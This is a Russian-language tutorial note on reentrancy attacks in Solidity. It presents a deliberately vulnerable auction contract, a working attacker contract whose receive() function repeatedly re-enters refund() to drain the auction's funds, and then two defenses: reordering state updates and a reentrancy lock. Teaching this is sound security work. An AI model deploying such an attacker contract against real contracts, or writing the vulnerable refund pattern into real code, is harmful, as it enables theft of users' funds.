### Reentrancy Attack

Допустим есть аукцион:

```solidity
contract ReentrancyAuction {
    mapping (address => uint) public bidders;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

    function refund() external {
        uint _amount = bidders[msg.sender];
        if (_amount > 0) {
            (bool success, ) = msg.sender.call{value: _amount}("");
            require(success, "failed");

            bidders[msg.sender] = 0;
        }
    }

    function contractBalance() external view returns(uint) {
        return address(this).balance;
    }
}
```

Создаем свой контракт, через который будет выкачивать деньги:
```solidity
contract ReentrancyAttack {
    ReentrancyAuction auction;

    constructor(address _auction) {
        auction = ReentrancyAuction(_auction);
    }

    // проброс денег, то есть делаем извне транзакцию
    function proxyBid() external payable {
        auction.bid{value: msg.value}();
    }

    // сначала запускается функция attack(), после чего в ReentrancyAuction происходит call.
    // Пока call не завершен, мы попадаем в функцию receive (так как она payable), откуда
    // происходит еще один вызов. Все это будет происходить до того, пока весь баланс контракта
    // ReentrancyAuction не выкачается.
    function attack() external {
        auction.refund();
    }

    receive() external payable {
        auction.refund();
    }

    function currentBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

#### Как защититься?

1. Перед вызовом call в ReentrancyAuction нужно делать bidders[msg.sender] = 0;
2. Использовать noReentrancy(видимо абстрактный контракт) из OpenZeppelin либо написать самому:

```solidity
contract ReentrancyAuction {
    bool locked;

    modifier noReentrancy() {
        require(!locked, "no reentrancy");
        locked = true;
        _; // здесь выполняется код функции
        locked = false;
    }

    function refund() external noReentrancy {
        // code
    }

}
```

Блокировки других юзеров не произойдет, потому как транзакции выполняются одна за другой.
